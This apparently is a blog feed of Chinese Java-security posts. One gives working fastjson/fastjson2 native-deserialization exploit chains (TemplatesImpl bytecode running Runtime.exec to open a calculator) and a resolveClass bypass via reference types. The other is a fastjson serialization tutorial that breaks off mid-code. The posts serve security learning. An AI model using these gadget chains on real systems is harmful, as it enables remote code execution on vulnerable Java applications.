    
    
    
    <entry>
      <title>FastJson与原生反序列化</title>
      <link href="/2023/02/04/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/02/04/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="FastJson与原生反序列化"><a href="#FastJson与原生反序列化" class="headerlink" title="FastJson与原生反序列化"></a>FastJson与原生反序列化</h1><h2 id="第一版-lt-1-2-49"><a href="#第一版-lt-1-2-49" class="headerlink" title="第一版 &lt;1.2.49"></a>第一版 &lt;1.2.49</h2><p>在Json类当中的toString方法能触发toJsonString的调用，而这个东西其实我们并不陌生，在我们想用JSON.parse()触发get方法时，其中一个处理方法就是用JSONObject嵌套我们的payload</p><p>触发toString-&gt;toJSONString-&gt;get方法</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032239697.png"                      alt="image-20230421235341029"                ><figcaption>image-20230421235341029</figcaption></figure></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -na Calculator\&quot;);&quot;</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;y4tacker&quot;</span>);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        valfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        valfield.set(val, jsonArray);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(val);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h2 id="fastjson2-全版本"><a href="#fastjson2-全版本" class="headerlink" title="fastjson2 全版本"></a>fastjson2 全版本</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson2.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -na Calculator\&quot;);&quot;</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;y4tacker&quot;</span>);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        valfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        valfield.set(val, jsonArray);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(val);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="绕过resolveClass"><a href="#绕过resolveClass" class="headerlink" title="绕过resolveClass"></a>绕过resolveClass</h2><h3 id="查看不会调用的情况"><a href="#查看不会调用的情况" class="headerlink" title="查看不会调用的情况"></a>查看不会调用的情况</h3><p>跟进<code>java.io.ObjectInputStream#readObject0</code>,会根据读到的bytes中tc的数据类型做不同的处理去恢复部分对象</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (tc) &#123;</span><br><span class="line">                <span class="keyword">case</span> TC_NULL:</span><br><span class="line">                    <span class="keyword">return</span> readNull();</span><br><span class="line">                <span class="keyword">case</span> TC_REFERENCE:</span><br><span class="line">                    <span class="keyword">return</span> readHandle(unshared);</span><br><span class="line">                <span class="keyword">case</span> TC_CLASS:</span><br><span class="line">                    <span class="keyword">return</span> readClass(unshared);</span><br><span class="line">                <span class="keyword">case</span> TC_CLASSDESC:</span><br><span class="line">                <span class="keyword">case</span> TC_PROXYCLASSDESC:</span><br><span class="line">                    <span class="keyword">return</span> readClassDesc(unshared);</span><br><span class="line">                <span class="keyword">case</span> TC_STRING:</span><br><span class="line">                <span class="keyword">case</span> TC_LONGSTRING:</span><br><span class="line">                    <span class="keyword">return</span> checkResolve(readString(unshared));</span><br><span class="line">                <span class="keyword">case</span> TC_ARRAY:</span><br><span class="line">                    <span class="keyword">return</span> checkResolve(readArray(unshared));</span><br><span class="line">                <span class="keyword">case</span> TC_ENUM:</span><br><span class="line">                    <span class="keyword">return</span> checkResolve(readEnum(unshared));</span><br><span class="line">                <span class="keyword">case</span> TC_OBJECT:</span><br><span class="line">                    <span class="keyword">return</span> checkResolve(readOrdinaryObject(unshared));</span><br><span class="line">                <span class="keyword">case</span> TC_EXCEPTION:</span><br><span class="line">                    <span class="type">IOException</span> <span class="variable">ex</span> <span class="operator">=</span> readFatalException();</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">WriteAbortedException</span>(<span class="string">&quot;writing aborted&quot;</span>, ex);</span><br><span class="line">                <span class="keyword">case</span> TC_BLOCKDATA:</span><br><span class="line">                <span class="keyword">case</span> TC_BLOCKDATALONG:</span><br><span class="line">                    <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">                        bin.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">                        bin.peek();             <span class="comment">// force header read</span></span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(</span><br><span class="line">                            bin.currentBlockRemaining());</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">                            <span class="string">&quot;unexpected block data&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">case</span> TC_ENDBLOCKDATA:</span><br><span class="line">                    <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(<span class="literal">true</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">                            <span class="string">&quot;unexpected end of block data&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">                        String.format(<span class="string">&quot;invalid type code: %02X&quot;</span>, tc));</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></div><p>上面的不同case中大部分类都会最终调用<code>readClassDesc</code>去获取类的描述符，在这个过程中如果当前反序列化数据下一位仍然是<code>TC_CLASSDESC</code>那么就会在<code>readNonProxyDesc</code>中触发<code>resolveClass</code></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032239877.png"                      alt="image-20230511210810954"                ><figcaption>image-20230511210810954</figcaption></figure></p><p>上面这个switch分支的代码，不会调用<code>readClassDesc</code>的分支有<code>TC_NULL</code>、<code>TC_REFERENCE</code>、<code>TC_STRING</code>、<code>TC_LONGSTRING</code>、<code>TC_EXCEPTION</code></p><p>所以思路是放两个类进去，并且第二个类必须是<code>TC_NULL</code>、<code>TC_REFERENCE</code>、<code>TC_STRING</code>、<code>TC_LONGSTRING</code>、<code>TC_EXCEPTION</code>中的一个，这里利用引用类型（因为其他类型要么毫无用处，要么用于解决序列化终止相关）</p><h3 id="引用类型的利用"><a href="#引用类型的利用" class="headerlink" title="引用类型的利用"></a>引用类型的利用</h3><p>当向List、set、map类型中添加同样对象时即可成功利用，这里也简单提一下，这里以List为例，</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ArrayList&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">arrayList.add(templates);</span><br><span class="line">arrayList.add(templates);</span><br><span class="line">writeObjects(arrayList);</span><br></pre></td></tr></table></figure></div><p>当我们写入同样的对象时，第二个会变成引用类型</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032239655.png"                      alt="image-20230511211004050"                ><figcaption>image-20230511211004050</figcaption></figure></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastjson </tag>
            
            <tag> java </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjson学习</title>
      <link href="/2023/02/01/fastjson%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/02/01/fastjson%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="fastjson学习"><a href="#fastjson学习" class="headerlink" title="fastjson学习"></a>fastjson学习</h1><p>fastjson组件可以类对象序列化成json字符串，再通过JSON.parse、JSON.parseObject等方法反序列化成类对象</p><h2 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h2><h3 id="常见类型"><a href="#常见类型" class="headerlink" title="常见类型"></a>常见类型</h3><ul><li>JSONObject</li><li>JSONArray</li></ul><h3 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;zhangsan&quot;</span>,<span class="number">12</span>);</span><br><span class="line"><span class="comment">//序列化</span></span><br><span class="line"><span class="type">String</span> <span class="variable">serializedStr</span> <span class="operator">=</span> JSON.toJSONString(user); </span><br><span class="line">System.out.println(serializedStr);</span><br><span class="line"><span class="comment">//通过parse方法进行反序列化，返回的是一个JSONObject</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj1</span> <span class="operator">=</span> JSON.parse(serializedStr); </span><br><span class="line">System.out.println(<span class="string">&quot;parse反序列化对象名称:&quot;</span>+obj1.getClass().getName()); System.out.println(<span class="string">&quot;parse反序列化:&quot;</span>+obj1);</span><br><span class="line"><span class="comment">//通过parseObject,不指定类，返回的是一个JSONObject</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj2</span> <span class="operator">=</span> JSON.parseObject(serializedStr); </span><br><span class="line">System.out.println(<span class="string">&quot;parseObject反序列化对象名称:&quot;</span>+obj2.getClass().getName()); System.out.println(<span class="string">&quot;parseObject反序列化:&quot;</span>+obj2);</span><br><span class="line"><span class="comment">//通过parseObject,指定类后返回的是一个相应的类对象</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj3</span> <span class="operator">=</span> JSON.parseObject(serializedStr,User.class); </span><br><span class="line">System.out.println(<span class="string">&quot;parseObject反序列化对象名称:&quot;</span>+obj3.getClass().getName()); System.out.println(<span class="string">&quot;parseObject反序列化:&quot;</span>+obj3);</span><br><span class="line"></span><br><span class="line"><span class="comment">//@type</span></span><br><span class="line"><span class="type">String</span> <span class="variable">serializedStr</span> <span class="operator">=</span> JSON.toJSONString(user);</span><br><span class="line">System.out.println(serializedStr);</span><br><span class="line"><span class="type">String</span> <span class="variable">serializedStr1</span> <span class="operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName); System.out.println(serializedStr1);</span><br><span class="line">System.out.println(JSON.parse(serializedStr).getClass().toString());</span><br><span class="line">System.out.println(JSON.parse(serializedStr1).getClass().toString());</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line">有参构造</span><br><span class="line">getId</span><br><span class="line">getName&#123;<span class="string">&quot;id&quot;</span>:<span class="number">12</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zhangsan&quot;</span>&#125;</span><br><span class="line">parse反序列化对象名称:com.alibaba.fastjson.JSONObject</span><br><span class="line">parse反序列化:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zhangsan&quot;</span>,<span class="string">&quot;id&quot;</span>:<span class="number">12</span>&#125;</span><br><span class="line">parseObject反序列化对象名称:com.alibaba.fastjson.JSONObject</span><br><span class="line">parseObject反序列化:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zhangsan&quot;</span>,<span class="string">&quot;id&quot;</span>:<span class="number">12</span>&#125;</span><br><span class="line">无参构造</span><br><span class="line">setId</span><br><span class="line">setName</span><br><span class="line">parseObject反序列化对象名称:com.example.fastjson.User</span><br><span class="line">parseObject反序列化:User&#123;name=<span class="string">&#x27;zhangsan&#x27;</span>, id=<span class="number">12</span>&#125;</span><br><span class="line"><span class="comment">//@type</span></span><br><span class="line">getId</span><br><span class="line">getName</span><br><span class="line">&#123;<span class="string">&quot;id&quot;</span>:<span class="number">12</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zhangsan&quot;</span>&#125;</span><br><span class="line">getId</span><br><span class="line">getName</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.example.fastjson.User&quot;</span>,<span class="string">&quot;id&quot;</span>:<span class="number">12</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zhangsan&quot;</span>&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">com</span>.alibaba.fastjson.JSONObject</span><br><span class="line">无参构造</span><br><span class="line">setId</span><br><span class="line">setName</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">com</span>.example.fastjson.User</span><br></pre></td></tr></table></figure></div><blockquote><p>总结：</p><ul><li>要想反序列化后得到对应类型的类，需要使用parseObject并传入类的.class<ul><li>同时这样生成的序列化json字符串中会带有@type属性，存储着对应的类完整包路径</li></ul></li><li>parseObject(“”,class) 会识别并调用目标类的特定 setter 方法及某些特定条件的 getter 方法</li><li>调用toJSONString镜像序列化的时候，会调用getter</li><li>不指定@type不会调用<strong>构造方法</strong>和<strong>setter</strong></li><li>指定@type时，parse只会调用<strong>构造方法</strong>和特定setter，而parseObject会额外调用getter</li></ul></blockquote><h3 id="public-x2F-private属性区别"><a href="#public-x2F-private属性区别" class="headerlink" title="public&#x2F;private属性区别"></a>public&#x2F;private属性区别</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String full_name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> Boolean sex;</span><br><span class="line">    <span class="keyword">private</span> Properties prop; <span class="comment">//构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Person构造函数&quot;</span>); &#125;</span><br><span class="line">    <span class="comment">//set</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge()&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//get 返回Boolean</span></span><br><span class="line">    <span class="keyword">public</span> Boolean <span class="title function_">getSex</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getSex()&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.sex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//get 返回ProPerties</span></span><br><span class="line">    <span class="keyword">public</span> Properties <span class="title function_">getProp</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getProp()&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.prop;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//在输出时会自动调用的对象ToString函数 </span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> 